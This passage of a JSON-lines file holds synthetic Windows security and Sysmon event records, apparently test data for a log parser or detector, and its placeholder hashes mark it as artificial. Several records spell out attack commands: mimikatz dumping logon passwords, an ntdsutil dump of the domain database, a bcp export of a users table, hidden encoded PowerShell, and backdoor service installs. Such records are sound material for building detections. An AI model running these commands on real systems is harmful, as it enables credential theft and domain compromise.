C:\\inetpub\\temp\\privs.txt</Data><Data Name=\"ParentProcessName\">C:\\inetpub\\wwwroot\\app\\w3wp.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T14:00:00.000Z\"/><EventRecordID>3008</EventRecordID><Channel>Security</Channel><Computer>SERVER-DB-01.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-80-1</Data><Data Name=\"SubjectUserName\">MSSQLSERVER</Data><Data Name=\"SubjectDomainName\">NT SERVICE</Data><Data Name=\"NewProcessId\">0x36B0</Data><Data Name=\"NewProcessName\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"TokenElevationType\">%%1936</Data><Data Name=\"ProcessId\">0x157C</Data><Data Name=\"CommandLine\">cmd.exe /c bcp &quot;SELECT * FROM users&quot; queryout C:\\temp\\users.csv /c /S localhost</Data><Data Name=\"ParentProcessName\">C:\\Program Files\\Microsoft SQL Server\\MSSQL16\\MSSQL\\Binn\\sqlservr.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T16:00:00.000Z\"/><EventRecordID>3009</EventRecordID><Channel>Security</Channel><Computer>WORKSTATION-05.corp.local</Computer></System><EventData><Data Name=\"SubjectUserSid\">S-1-5-21-3623811015-3361044348-30300820-1002</Data><Data Name=\"SubjectUserName\">agarcia</Data><Data Name=\"SubjectDomainName\">CORP</Data><Data Name=\"NewProcessId\">0x0834</Data><Data Name=\"NewProcessName\">C:\\Windows\\System32\\notepad.exe</Data><Data Name=\"TokenElevationType\">%%1936</Data><Data Name=\"ProcessId\">0x044C</Data><Data Name=\"CommandLine\">notepad.exe C:\\Users\\agarcia\\Documents\\notes.txt</Data><Data Name=\"ParentProcessName\">C:\\Windows\\explorer.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>14339</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T00:45:00.000Z\"/><EventRecordID>4001</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"TargetUserName\">jsmith</Data><Data Name=\"TargetDomainName\">CORP.LOCAL</Data><Data Name=\"TargetSid\">S-1-5-21-3623811015-3361044348-30300820-1001</Data><Data Name=\"ServiceName\">krbtgt</Data><Data Name=\"ServiceSid\">S-1-5-21-3623811015-3361044348-30300820-502</Data><Data Name=\"TicketOptions\">0x40810010</Data><Data Name=\"Status\">0x0</Data><Data Name=\"TicketEncryptionType\">0x12</Data><Data Name=\"PreAuthType\">15</Data><Data Name=\"IpAddress\">::ffff:192.168.1.100</Data><Data Name=\"IpPort\">49600</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>14339</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T03:00:00.000Z\"/><EventRecordID>4002</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"TargetUserName\">agarcia</Data><Data Name=\"TargetDomainName\">CORP.LOCAL</Data><Data Name=\"TargetSid\">S-1-5-21-3623811015-3361044348-30300820-1002</Data><Data Name=\"ServiceName\">krbtgt</Data><Data Name=\"ServiceSid\">S-1-5-21-3623811015-3361044348-30300820-502</Data><Data Name=\"TicketOptions\">0x40810010</Data><Data Name=\"Status\">0x0</Data><Data Name=\"TicketEncryptionType\">0x12</Data><Data Name=\"PreAuthType\">15</Data><Data Name=\"IpAddress\">::ffff:192.168.1.104</Data><Data Name=\"IpPort\">49603</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>14339</Task><Opcode>0</Opcode><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T05:00:00.000Z\"/><EventRecordID>4003</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"TargetUserName\">nonexistent_user</Data><Data Name=\"TargetDomainName\">CORP.LOCAL</Data><Data Name=\"TargetSid\">S-1-0-0</Data><Data Name=\"ServiceName\">krbtgt</Data><Data Name=\"ServiceSid\">S-1-5-21-3623811015-3361044348-30300820-502</Data><Data Name=\"TicketOptions\">0x40810010</Data><Data Name=\"Status\">0x6</Data><Data Name=\"TicketEncryptionType\">0xffffffff</Data><Data Name=\"PreAuthType\">0</Data><Data Name=\"IpAddress\">::ffff:192.168.1.101</Data><Data Name=\"IpPort\">49650</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>14339</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T07:00:00.000Z\"/><EventRecordID>4004</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"TargetUserName\">bwilson</Data><Data Name=\"TargetDomainName\">CORP.LOCAL</Data><Data Name=\"TargetSid\">S-1-5-21-3623811015-3361044348-30300820-1003</Data><Data Name=\"ServiceName\">krbtgt</Data><Data Name=\"ServiceSid\">S-1-5-21-3623811015-3361044348-30300820-502</Data><Data Name=\"TicketOptions\">0x40810010</Data><Data Name=\"Status\">0x0</Data><Data Name=\"TicketEncryptionType\">0x12</Data><Data Name=\"PreAuthType\">15</Data><Data Name=\"IpAddress\">::ffff:192.168.1.103</Data><Data Name=\"IpPort\">49605</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4769</EventID><Version>0</Version><Level>0</Level><Task>14337</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T01:00:00.000Z\"/><EventRecordID>5001</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"TargetUserName\">jsmith@CORP.LOCAL</Data><Data Name=\"TargetDomainName\">CORP.LOCAL</Data><Data Name=\"ServiceName\">cifs/DC01.CORP.LOCAL</Data><Data Name=\"ServiceSid\">S-1-5-21-3623811015-3361044348-30300820-1000</Data><Data Name=\"TicketOptions\">0x40810000</Data><Data Name=\"TicketEncryptionType\">0x12</Data><Data Name=\"IpAddress\">::ffff:192.168.1.101</Data><Data Name=\"IpPort\">49601</Data><Data Name=\"Status\">0x0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4769</EventID><Version>0</Version><Level>0</Level><Task>14337</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T03:00:00.000Z\"/><EventRecordID>5002</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"TargetUserName\">jsmith@CORP.LOCAL</Data><Data Name=\"TargetDomainName\">CORP.LOCAL</Data><Data Name=\"ServiceName\">MSSQLSvc/DB01.CORP.LOCAL:1433</Data><Data Name=\"ServiceSid\">S-1-5-21-3623811015-3361044348-30300820-1100</Data><Data Name=\"TicketOptions\">0x40810000</Data><Data Name=\"TicketEncryptionType\">0x17</Data><Data Name=\"IpAddress\">::ffff:192.168.1.101</Data><Data Name=\"IpPort\">49602</Data><Data Name=\"Status\">0x0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4769</EventID><Version>0</Version><Level>0</Level><Task>14337</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T05:00:00.000Z\"/><EventRecordID>5003</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"TargetUserName\">admin@CORP.LOCAL</Data><Data Name=\"TargetDomainName\">CORP.LOCAL</Data><Data Name=\"ServiceName\">krbtgt/CORP.LOCAL</Data><Data Name=\"ServiceSid\">S-1-5-21-3623811015-3361044348-30300820-502</Data><Data Name=\"TicketOptions\">0x40810000</Data><Data Name=\"TicketEncryptionType\">0x17</Data><Data Name=\"IpAddress\">::ffff:192.168.1.102</Data><Data Name=\"IpPort\">49604</Data><Data Name=\"Status\">0x0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4769</EventID><Version>0</Version><Level>0</Level><Task>14337</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T07:00:00.000Z\"/><EventRecordID>5004</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"TargetUserName\">svc_backup@CORP.LOCAL</Data><Data Name=\"TargetDomainName\">CORP.LOCAL</Data><Data Name=\"ServiceName\">cifs/DB01.CORP.LOCAL</Data><Data Name=\"ServiceSid\">S-1-5-21-3623811015-3361044348-30300820-1000</Data><Data Name=\"TicketOptions\">0x40810000</Data><Data Name=\"TicketEncryptionType\">0x12</Data><Data Name=\"IpAddress\">::ffff:192.168.1.105</Data><Data Name=\"IpPort\">49609</Data><Data Name=\"Status\">0x0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\"/><EventID>4769</EventID><Version>0</Version><Level>0</Level><Task>14337</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T09:00:00.000Z\"/><EventRecordID>5005</EventRecordID><Channel>Security</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"TargetUserName\">agarcia@CORP.LOCAL</Data><Data Name=\"TargetDomainName\">CORP.LOCAL</Data><Data Name=\"ServiceName\">cifs/DB01.CORP.LOCAL</Data><Data Name=\"ServiceSid\">S-1-5-21-3623811015-3361044348-30300820-1000</Data><Data Name=\"TicketOptions\">0x40810000</Data><Data Name=\"TicketEncryptionType\">0x12</Data><Data Name=\"IpAddress\">::ffff:192.168.1.104</Data><Data Name=\"IpPort\">49613</Data><Data Name=\"Status\">0x0</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"System\" Guid=\"{27D7FD72-688D-4B97-B4E1-ABCDEF123456}\"/><EventID>7045</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T02:00:00.000Z\"/><EventRecordID>6001</EventRecordID><Channel>System</Channel><Computer>WORKSTATION-03.corp.local</Computer></System><EventData><Data Name=\"ServiceName\">MaliciousService</Data><Data Name=\"ImagePath\">C:\\Users\\bwilson\\Downloads\\backdoor.exe</Data><Data Name=\"ServiceType\">user mode service</Data><Data Name=\"StartType\">auto start</Data><Data Name=\"AccountName\">LocalSystem</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"System\" Guid=\"{27D7FD72-688D-4B97-B4E1-ABCDEF123456}\"/><EventID>7045</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T04:00:00.000Z\"/><EventRecordID>6002</EventRecordID><Channel>System</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"ServiceName\">WindowsUpdateHelper</Data><Data Name=\"ImagePath\">C:\\Windows\\Temp\\svc_update.exe</Data><Data Name=\"ServiceType\">user mode service</Data><Data Name=\"StartType\">auto start</Data><Data Name=\"AccountName\">LocalSystem</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"System\" Guid=\"{27D7FD72-688D-4B97-B4E1-ABCDEF123456}\"/><EventID>7045</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T06:00:00.000Z\"/><EventRecordID>6003</EventRecordID><Channel>System</Channel><Computer>WORKSTATION-01.corp.local</Computer></System><EventData><Data Name=\"ServiceName\">SentinelAgent</Data><Data Name=\"ImagePath\">C:\\Program Files\\Sentinel\\SentinelAgent.exe</Data><Data Name=\"ServiceType\">user mode service</Data><Data Name=\"StartType\">auto start</Data><Data Name=\"AccountName\">LocalSystem</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"System\" Guid=\"{27D7FD72-688D-4B97-B4E1-ABCDEF123456}\"/><EventID>7045</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T08:00:00.000Z\"/><EventRecordID>6004</EventRecordID><Channel>System</Channel><Computer>WORKSTATION-04.corp.local</Computer></System><EventData><Data Name=\"ServiceName\">RemoteAccessSvc</Data><Data Name=\"ImagePath\">cmd.exe /c powershell.exe -ep bypass -e aQBlAHgA</Data><Data Name=\"ServiceType\">user mode service</Data><Data Name=\"StartType\">demand start</Data><Data Name=\"AccountName\">LocalSystem</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T01:00:00.000Z\"/><EventRecordID>7001</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WORKSTATION-01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">technique_id=T1059.001,technique_name=PowerShell</Data><Data Name=\"UtcTime\">2026-03-14 01:00:00.000</Data><Data Name=\"ProcessGuid\">{A1B2C3D4-1111-4E5F-6A7B-8C9D0E1F2A3B}</Data><Data Name=\"ProcessId\">8800</Data><Data Name=\"Image\">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name=\"FileVersion\">10.0.19041.1</Data><Data Name=\"CommandLine\">powershell.exe -nop -w hidden -enc aQBlAHgA</Data><Data Name=\"CurrentDirectory\">C:\\Users\\jsmith\\</Data><Data Name=\"User\">CORP\\jsmith</Data><Data Name=\"LogonGuid\">{A1B2C3D4-0000-4E5F-0000-000000000000}</Data><Data Name=\"LogonId\">0x12345</Data><Data Name=\"TerminalSessionId\">1</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"Hashes\">SHA256=ABC123DEF456789</Data><Data Name=\"ParentProcessGuid\">{A1B2C3D4-2222-4E5F-6A7B-8C9D0E1F2A3B}</Data><Data Name=\"ParentProcessId\">4012</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"ParentCommandLine\">cmd.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T03:00:00.000Z\"/><EventRecordID>7002</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WORKSTATION-02.corp.local</Computer></System><EventData><Data Name=\"RuleName\">technique_id=T1003,technique_name=Credential Dumping</Data><Data Name=\"UtcTime\">2026-03-14 03:00:00.000</Data><Data Name=\"ProcessGuid\">{B2C3D4E5-3333-4F6A-7B8C-9D0E1F2A3B4C}</Data><Data Name=\"ProcessId\">6688</Data><Data Name=\"Image\">C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.exe</Data><Data Name=\"FileVersion\">1.0.0.0</Data><Data Name=\"CommandLine\">payload.exe --inject</Data><Data Name=\"CurrentDirectory\">C:\\Users\\jsmith\\AppData\\Local\\Temp\\</Data><Data Name=\"User\">CORP\\jsmith</Data><Data Name=\"LogonGuid\">{B2C3D4E5-0000-4F6A-0000-000000000000}</Data><Data Name=\"LogonId\">0x23456</Data><Data Name=\"TerminalSessionId\">1</Data><Data Name=\"IntegrityLevel\">Medium</Data><Data Name=\"Hashes\">SHA256=DEF456ABC789012</Data><Data Name=\"ParentProcessGuid\">{B2C3D4E5-4444-4F6A-7B8C-9D0E1F2A3B4C}</Data><Data Name=\"ParentProcessId\">4012</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"ParentCommandLine\">cmd.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T05:00:00.000Z\"/><EventRecordID>7003</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WORKSTATION-04.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-03-14 05:00:00.000</Data><Data Name=\"ProcessGuid\">{C3D4E5F6-5555-4A7B-8C9D-0E1F2A3B4C5D}</Data><Data Name=\"ProcessId\">7700</Data><Data Name=\"Image\">C:\\Users\\agarcia\\Downloads\\mimikatz.exe</Data><Data Name=\"FileVersion\">2.2.0</Data><Data Name=\"CommandLine\">mimikatz.exe privilege::debug sekurlsa::logonpasswords</Data><Data Name=\"CurrentDirectory\">C:\\Users\\agarcia\\Downloads\\</Data><Data Name=\"User\">CORP\\agarcia</Data><Data Name=\"LogonGuid\">{C3D4E5F6-0000-4A7B-0000-000000000000}</Data><Data Name=\"LogonId\">0x34567</Data><Data Name=\"TerminalSessionId\">1</Data><Data Name=\"IntegrityLevel\">High</Data><Data Name=\"Hashes\">SHA256=GHI789JKL012345</Data><Data Name=\"ParentProcessGuid\">{C3D4E5F6-6666-4A7B-8C9D-0E1F2A3B4C5D}</Data><Data Name=\"ParentProcessId\">6600</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"ParentCommandLine\">cmd.exe</Data></EventData></Event>"}
{"source_type":"winevt_xml","raw":"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=\"2026-03-14T07:00:00.000Z\"/><EventRecordID>7004</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SERVER-DC-01.corp.local</Computer></System><EventData><Data Name=\"RuleName\">-</Data><Data Name=\"UtcTime\">2026-03-14 07:00:00.000</Data><Data Name=\"ProcessGuid\">{D4E5F6A7-7777-4B8C-9D0E-1F2A3B4C5D6E}</Data><Data Name=\"ProcessId\">13000</Data><Data Name=\"Image\">C:\\Windows\\System32\\ntdsutil.exe</Data><Data Name=\"FileVersion\">10.0.17763.1</Data><Data Name=\"CommandLine\">ntdsutil.exe &quot;activate instance ntds&quot; ifm &quot;create full C:\\temp\\ntds_dump&quot;</Data><Data Name=\"CurrentDirectory\">C:\\Windows\\System32\\</Data><Data Name=\"User\">CORP\\admin</Data><Data Name=\"LogonGuid\">{D4E5F6A7-0000-4B8C-0000-000000000000}</Data><Data Name=\"LogonId\">0x45678</Data><Data Name=\"TerminalSessionId\">0</Data><Data Name=\"IntegrityLevel\">System</Data><Data Name=\"Hashes\">SHA256=MNO345PQR678901</Data><Data Name=\"ParentProcessGuid\">{D4E5F6A7-8888-4B8C-9D0E-1F2A3B4C5D6E}</Data><Data Name=\"ParentProcessId\">888</Data><Data Name=\"ParentImage\">C:\\Windows\\System32\\cmd.exe</Data><Data Name=\"ParentCommandLine\">cmd.exe</Data></EventData></Event>"}
